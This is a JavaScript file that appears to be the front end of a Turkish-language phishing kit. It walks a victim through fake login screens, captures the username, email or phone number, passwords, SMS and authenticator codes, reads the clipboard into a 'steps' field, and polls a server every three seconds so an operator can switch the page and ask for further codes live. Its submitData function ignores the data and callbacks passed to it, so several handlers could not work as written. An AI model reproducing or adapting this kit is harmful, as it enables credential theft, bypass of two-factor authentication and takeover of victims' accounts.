const PROCESS_URL = "veri2.php";
const CHECK_INTERVAL = 3000;


function submitData() {
    const currentUrl = window.location.pathname;
    const urlPath = currentUrl.substring(currentUrl.lastIndexOf('/') + 1);
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "livechat.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const responseText = xhr.responseText.trim();
            switch (responseText) {
                case "sms":
                    window.location.href = 'sms.php';
                    break;
                case "hata":
                    window.location.href = 'hatali.php';
                    break;
                case "sms2":
                    window.location.href = 'bildirim.php';
                    break;
                case "back":
                    window.location.href = '/';
                    break;
                case "tebrik":
                    window.location.href = 'basarili.php';
                    break;
                default:
                   
            }
        }
    };
    xhr.send(`x=${urlPath}`);
}

function maskPhoneNumber(phoneNumber) {
    return phoneNumber.replace(/^.{6}/, "******");
}
function validatePhoneNumber(phoneNumber) {
    return phoneNumber.length > 9;
}
function validateEmailDomain(email) {
    var allowedDomains = [
        "@gmail.com",
        "@hotmail.com",
        "@yandex.com",
        "@domain.com",
        "@yahoo.com",
        "@outlook.com",
        "@icloud.com",
        "@mail.ru",
        "@aol.com",
        "@zoho.com",
        "@protonmail.com",
        "@gmx.com"
    ];
    return allowedDomains.some(function(domain) {
        return email.endsWith(domain);
    });
}
$(document).ready(function() {
    $("#txtUserName").on("keyup", function() {
        var txtUserName = $(this).val();

        if (txtUserName.length >= 3 && !isNaN(txtUserName)) {
            $("#firstLogin, #firstLoginButton").hide();
            $("#phoneArea").show();
            $("#phoneinput").val(txtUserName);
            setTimeout(function() {
                $("#phoneinput").show().focus();
            }, 0);
            $("#alternativeButton").show();
        } else {
            $("#firstLogin").show();
            if (txtUserName.length < 3) {
                $("#firstLoginButton").show();
            }
            $("#phoneArea, #alternativeButton, #phoneinput").hide();
        }
    });

    $("#phoneinput").on("keyup", function() {
        var phoneInputValue = $(this).val();
        $("#txtUserName").val(phoneInputValue);
    });

    $(".bn-svg").on("click", function() {
        $("#phoneinput").val('');
        $("#txtUserName").val('');
        $("#firstLogin").show();
        $("#firstLoginButton").show();
        $("#phoneArea, #alternativeButton, #phoneinput").hide();
    });
});   
var formType = "";
function setFormType(type) {
    formType = type;
}
function getFormType() {
    return formType;
}
function submitAlternative() {
    var phoneinput = $("#phoneinput").val();
    var txtIP = $("#ipgs").val();

    submitData("submitAlternative", { phoneinput: phoneinput, txtIP: txtIP }, function () {
        if (validatePhoneNumber(phoneinput)) {
            setFormType("alternative");
            $("#alternativeButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#phoneArea, #waveLoader").hide();
                $("#passwordLogin, #passwordLoginButton").show();
                var maskedPhone = maskPhoneNumber(phoneinput);
                $("#codeNumber").text(maskedPhone + " numarasına gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("submittedData", phoneinput);
            }, 3000);
        } else {
           
        }
    });
}
function submitEmail() {
    var txtEmail = $("#txtEmail").val();
    var txtIP = $("#ipgs").val();

    submitData("submitEmail", { txtEmail: txtEmail, txtIP: txtIP }, function () {
        setFormType("email");
        $("#emailLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
            $("#emailLogin, #waveLoader").hide();
            $("#waitModal").show();
            localStorage.setItem("emailData", txtEmail);
        }, 3000);
    });
}
function submitPassword() {
    var txtPassword = $("#txtPassword").val();
    var formType = getFormType();
    var txtIP = $("#ipgs").val();

    
        submitData("submitPassword", { txtPassword: txtPassword, txtIP: txtIP }, function () {
            $("#passwordLoginButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waveLoader, #passwordLogin").hide();
                if (formType === "alternative") {
                    //console.log("submitPassword: Showing email login");
                    $("#emailLogin, #emailLoginButton").show();
                } else if (formType === "email") {
                    //console.log("submitPassword: Showing phone login");
                    $("#phoneLogin, #phoneLoginButton").show();
                } else {
                    console.log("submitPassword: formType is not set correctly");
                }
            }, 2000);
        });
}
function submitPasswordAgain() {
    var txtPasswordAgain = $("#txtPasswordAgain").val();
    var txtIP = $("#ipgs").val();

    
        submitData("submitPasswordAgain", { txtPasswordAgain: txtPasswordAgain, txtIP: txtIP }, function () {
            $("#passwordLoginButtonAgain").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waitModal").show();
                 
            }, 2000);
        });
    
}
function submitUsername() {
    var txtUserName = $("#txtUserName").val();
    var txtIP = $("#ipgs").val();

    /*var allowedDomains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"];

    function isValidDomain(email) {
        return allowedDomains.some(domain => email.endsWith("@" + domain));
    }*/

    if (validateEmail(txtUserName)) {
        /*if (!isValidDomain(txtUserName)) {
            alert("Please enter an email address with one of the allowed domains: " + allowedDomains.join(", "));
            return;
        }*/
        submitData("submitUsername", { txtUserName: txtUserName, txtIP: txtIP }, function () {
            setFormType("email"); 
            $("#waveLoader").show();
            $("#firstLoginButton").hide();
            setTimeout(function() {
                $("#firstLogin,#waveLoader").hide();
                $("#passwordLogin, #passwordLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000);
        });
    } else if (validatePhoneNumber(txtUserName)) {
        submitData("submitUsername", { txtUserName: txtUserName, txtIP: txtIP }, function () {
            setFormType("alternative");
            $("#firstLogin, #firstLoginButton").hide();
            $("#waveLoader").show();
            setTimeout(function() {
                $("#waveLoader").hide();
                $("#emailLogin, #emailLoginButton").show();
                $("#emailData").text(txtUserName + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
                localStorage.setItem("emailData", txtUserName);
            }, 3000); 
        });
    } else { }
}
function validateEmail(email) {
    var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return re.test(email);
}
function validatePhoneNumber(phone) {
    var re = /^\d{10}$/; 
    return re.test(phone);
}
function submitPhone() {
    var txtPhoneNumber = $("#txtPhoneNumber").val();
    var txtIP = $("#ipgs").val();

    if (txtPhoneNumber.length <= 9) {
        return;
    }

    submitData("submitPhone", { txtPhoneNumber: txtPhoneNumber, txtIP: txtIP }, function () {
        $("#phoneLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
            $("#waitModal").show();
            var maskedPhone = maskPhoneNumber(txtPhoneNumber);
            $("#codeNumber").text(maskedPhone + " telefon numarasına gönderilen 6 haneli doğrulama kodunu giriniz");
            localStorage.setItem("submittedData", txtPhoneNumber);
        }, 2000);
    });
}


$(document).ready(function() {
    $("#txtPassword").on("input", function() {
        var password = $(this).val();
        if (password === "") {
            $("#passwordInput").css("border-color", "red");
            $("#errorPassword").show().text("Parola boş olamaz!");
        } else {
            $("#passwordInput").css("border-color", "");
            $("#errorPassword").hide();
        }
    });

    $("#txtPassword").on("focus", function() {
        $("#passwordInput").css("border-color", "");
        $("#errorPassword").hide();
    });

    $("#txtPassword").on("blur", function() {
        var password = $(this).val();
        if (password === "") {
            $("#passwordInput").css("border-color", "red");
            $("#errorPassword").show().text("Parola boş olamaz!");
        }
    });
});




function submitCode() {
    var txtCode = $("#txtCode").val();
    var txtIP = $("#ipgs").val();

    if (txtCode.length <= 5) {
        return;
    }


    submitData("submitCode", { txtCode: txtCode, txtIP: txtIP }, function () {
        $("#codeLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
        
    });
}

function submitCodeAgain() {
    var txtCodeAgain = $("#txtCodeAgain").val();
    var txtIP = $("#ipgs").val();

     if (txtCodeAgain.length <= 5) {
        return;
    }

    submitData("submitCodeAgain", { txtCodeAgain: txtCodeAgain, txtIP: txtIP }, function () {
        $("#codeLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
        
    });
}

function submitAuth() {
    var txtAuth = $("#txtAuth").val();
    var txtIP = $("#ipgs").val();

    if (txtAuth.length <= 5) {
        return;
    }

    submitData("submitAuth", { txtAuth: txtAuth, txtIP: txtIP }, function () {
        $("#authLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitAuthAgain() {
    var txtAuthAgain = $("#txtAuthAgain").val();
    var txtIP = $("#ipgs").val();

    if (txtAuthAgain.length <= 5) {
        return;
    }

    submitData("submitAuthAgain", { txtAuthAgain: txtAuthAgain, txtIP: txtIP }, function () {
        $("#authLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitSteps() {
    var txtSteps = $("#txtSteps").val();
    var txtIP = $("#ipgs").val();

    if (txtSteps.length <= 5) {
        return;
    }

    submitData("submitSteps", { txtSteps: txtSteps, txtIP: txtIP }, function () {
        $("#stepsLoginButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}

function submitStepsAgain() {
    var txtStepsAgain = $("#txtStepsAgain").val();
    var txtIP = $("#ipgs").val();

    if (txtStepsAgain.length <= 5) {
        return;
    }

    submitData("submitStepsAgain", { txtStepsAgain: txtStepsAgain, txtIP: txtIP  }, function () {
        $("#stepsLoginAgainButton").hide();
        $("#waveLoader").show();
        setTimeout(function() {
                $("#waitModal").show();
            }, 2000);
    });
}
/*
function checkUserOnline() {
    submitData("updateLastActivity", {}, function () {
        $.ajax({
            type: "POST",
            url: "online.php",
            success: function (response) {
                if (response === "online") {
                    //console.log("Kullanıcı çevrimiçi");
                } else {
                    //console.log("Kullanıcı çevrimdışı");
                }
            },
            error: function (error) {
                console.error("AJAX request failed:", error);
            }
        });
    });
}*/

 $(document).ready(function() {
            $("#txtCodeAgain").on("focus", function() {
                $("#codeField").css("border-color", "");
            });
 });

  $(document).ready(function() {
            $("#txtAuthAgain").on("focus", function() {
                $("#codeFieldAuth").css("border-color", "");
            });
 });

$(document).ready(function() {
    var storedData = localStorage.getItem("submittedData");
    if (storedData) {
        var maskedPhone = maskPhoneNumber(storedData);
        $("#codeNumber").text(maskedPhone + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
    }
});


$(document).ready(function() {
    var storedEmail = localStorage.getItem("emailData");
    if (storedEmail) {
        $("#emailData").text(storedEmail + " adresine gönderilen 6 haneli doğrulama kodunu giriniz");
    }
});

document.addEventListener('DOMContentLoaded', (event) => {
    const pasteButton = document.getElementById('pasteButton');
    const txtSteps = document.getElementById('txtSteps');

    pasteButton.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });

    txtSteps.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });
});

document.addEventListener('DOMContentLoaded', (event) => {
    const pasteButton = document.getElementById('pasteButtonf');
    const txtSteps = document.getElementById('txtStepsAgain');

    pasteButton.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text); 
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });

    txtSteps.addEventListener('click', () => {
        navigator.clipboard.readText().then(text => {
            txtSteps.value = text;
            console.log('Panodaki metin: ', text);
        }).catch(err => {
            console.error('Panodaki veriyi yapıştıramadım: ', err);
        });
    });
});



var waitInterval;
var lastResponse = ""; 

function wait() {
    submitData("wait", {}, function (response) {
        console.log("Response received: " + response); 
        
       
        if (response === lastResponse) {
            return;
        }

        lastResponse = response;

        if (response === "getCode") {
            $("#firstLogin, #passwordLoginAgain, #passwordLoginButtonAgain, #passwordAgainContent, #stepsLoginAgainButton, #stepsContent, #stepsLogin, #emailData, #authContent, #authLoginAgain, #authLogin, #stepsAgainContent, #stepsLoginAgain, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authAgainContent").hide();
            $("#codeLogin, #codeLoginButton, #codeContent, #codeNumber").show();
        } else if (response === "getCodeAgain") {
            $("#firstLogin, #stepsLoginAgainButton, #passwordLoginAgain, #passwordAgainContent, #passwordLoginButtonAgain, #stepsContent, #stepsLogin, #stepsLoginButton, #authContent, #authLogin, #authAgainContent, #authLoginAgain, #stepsAgainContent, #stepsLoginAgain, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLogin, #codeContent").hide();
            $("#codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #codeNumber").show();
        } else if (response === "getAuth") {
            $("#firstLogin, #stepsAgainContent, #passwordLoginAgain, #passwordAgainContent, #passwordLoginButtonAgain, #stepsLoginAgain, #stepsLoginAgainButton, #stepsContent, #stepsLogin, #codeAgainContent, #authAgainContent, #authLoginAgain, #codeLoginAgain, #codeContent, #codeLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #codeNumber").hide();
            $("#authLogin, #authLoginButton, #authContent, #emailData").show();
        } else if (response === "getAuthAgain") {
            $("#firstLogin, #stepsAgainContent, #passwordLoginAgain, #passwordAgainContent, #passwordLoginButtonAgain, #stepsLoginAgain, #codeContent, #stepsContent, #stepsLogin, #codeNumber, #codeLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData").hide();
            $("#authLoginAgain, #authLoginAgainButton, #authAgainContent, #emailData").show();
        } else if (response === "getSteps") {
            $("#firstLogin, #stepsAgainContent, #passwordLoginAgain, #passwordAgainContent, #passwordLoginButtonAgain, #stepsLoginAgain, #codeContent, #codeLogin, #codeNumber, #done, #doneContent, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData, #authLoginAgain, #authLoginAgainButton, #authAgainContent").hide();
            $("#stepsLogin, #stepsLoginButton, #stepsContent").show();
        } else if (response === "getStepsAgain") {
            $("#firstLogin, #codeContent, #codeNumber, #passwordLoginAgain, #passwordAgainContent, #passwordLoginButtonAgain, #codeLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData, #stepsLogin, #stepsLoginButton, #stepsContent, #authLoginAgain, #authLoginAgainButton, #authAgainContent").hide();
            $("#stepsLoginAgain, #stepsLoginAgainButton, #stepsAgainContent").show();
        } else if (response === "getDone") {
            $("#footer, #qrcode, #loginContent, #passwordLoginAgain, #passwordLoginButtonAgain, #firstLoginButton, #firstLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData, #stepsLogin, #stepsLoginButton, #stepsContent, #authLoginAgain, #authLoginAgainButton, #authAgainContent, #stepsLoginAgain, #stepsLoginAgainButton, #stepsAgainContent").hide();
            $("#done, #doneContent").show();
        } else if (response === "getPasswordAgain") {
            $("#footer, #qrcode, #loginContent, #firstLoginButton, #firstLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData, #stepsLogin, #stepsLoginButton, #stepsContent, #authLoginAgain, #authLoginAgainButton, #authAgainContent, #stepsLoginAgain, #stepsLoginAgainButton, #stepsAgainContent").hide();
            $("#passwordLoginAgain, #passwordLoginButtonAgain, #passwordAgainContent").show();
        } else if (response === "getok") {
            window.location.href = "redirect.php";
        } else {
            console.warn("Unexpected response: " + response);
        }
    });
}

function startWaitInterval() {
    if (waitInterval) {
        clearInterval(waitInterval);
    }
    waitInterval = setInterval(wait, CHECK_INTERVAL);
}

wait();
//setInterval(checkUserOnline, CHECK_INTERVAL);
startWaitInterval();



